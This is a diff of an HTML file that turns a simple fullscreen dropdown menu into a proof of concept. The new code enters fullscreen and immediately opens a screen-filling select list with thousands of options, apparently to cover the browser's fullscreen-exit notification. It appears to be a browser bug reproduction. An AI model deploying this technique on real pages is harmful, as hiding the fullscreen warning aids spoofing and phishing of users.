@@ -1,86 +1,85 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Fullscreen Dropdown</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-    }
+<meta charset="UTF-8">
+<title>Fullscreen Dropdown PoC (Improved)</title>
+<style>
+  body { margin:0; padding:0; overflow:hidden; font-family: Arial, sans-serif; }
 
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      margin: 20px;
-      cursor: pointer;
-    }
+  #testSelect {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    font-size: 2.5em;
+    z-index: 999999;
+  }
 
-    /* Dropdown fullscreen */
-    .fullscreen-dropdown {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(0,0,0,0.9);
-      color: white;
-      display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-    }
+  #overlayText {
+    position: fixed;
+    top: 10px;
+    left: 10px;
+    font-size: 1.5em;
+    color: red;
+    background: rgba(255,255,255,0.7);
+    padding: 5px 10px;
+    z-index: 1000000;
+  }
 
-    .fullscreen-dropdown.show {
-      display: flex;
-    }
-
-    .fullscreen-dropdown a {
-      color: white;
-      font-size: 24px;
-      margin: 10px;
-      text-decoration: none;
-    }
-  </style>
+  button {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    font-size: 1.2em;
+    padding: 10px 20px;
+    z-index: 1000001;
+  }
+</style>
 </head>
 <body>
 
-<button onclick="openFullscreen()">Buka Menu</button>
-
-<div id="dropdown" class="fullscreen-dropdown">
-  <a href="#">Menu 1</a>
-  <a href="#">Menu 2</a>
-  <a href="#">Menu 3</a>
-  <button onclick="closeFullscreen()">Tutup</button>
-</div>
+<div id="overlayText">Observe fullscreen toast overlap</div>
+<button onclick="startPoC()">Enter Fullscreen</button>
+<select id="testSelect"></select>
 
 <script>
-  function openFullscreen() {
-    let elem = document.documentElement;
+function startPoC() {
+  const select = document.getElementById("testSelect");
 
-    // Masuk fullscreen
-    if (elem.requestFullscreen) {
-      elem.requestFullscreen();
-    } else if (elem.webkitRequestFullscreen) {
-      elem.webkitRequestFullscreen();
-    } else if (elem.msRequestFullscreen) {
-      elem.msRequestFullscreen();
-    }
-
-    // Tampilkan dropdown
-    document.getElementById("dropdown").classList.add("show");
+  // Step 1: isi awal (langsung terlihat)
+  for (let i = 0; i < 1000; i++) {
+    let opt = document.createElement("option");
+    opt.textContent = "Option " + i;
+    select.appendChild(opt);
   }
 
-  function closeFullscreen() {
-    // Keluar fullscreen
-    if (document.exitFullscreen) {
-      document.exitFullscreen();
-    }
+  // Step 2: masuk fullscreen di timing frame
+  requestAnimationFrame(() => {
+    document.documentElement.requestFullscreen();
 
-    // Sembunyikan dropdown
-    document.getElementById("dropdown").classList.remove("show");
-  }
+    // Step 3: buka dropdown segera setelah fullscreen
+    setTimeout(() => {
+      select.focus();
+      select.size = 25;
+    }, 30);
+
+    // Step 4: tambah option bertahap (lebih stabil dari loop besar)
+    let i = 1000;
+    function addMore() {
+      for (let j = 0; j < 500; j++) {
+        let opt = document.createElement("option");
+        opt.textContent = "Option " + i++;
+        select.appendChild(opt);
+      }
+
+      if (i < 20000) {
+        requestAnimationFrame(addMore);
+      }
+    }
+    addMore();
+  });
+}
 </script>
 
 </body>
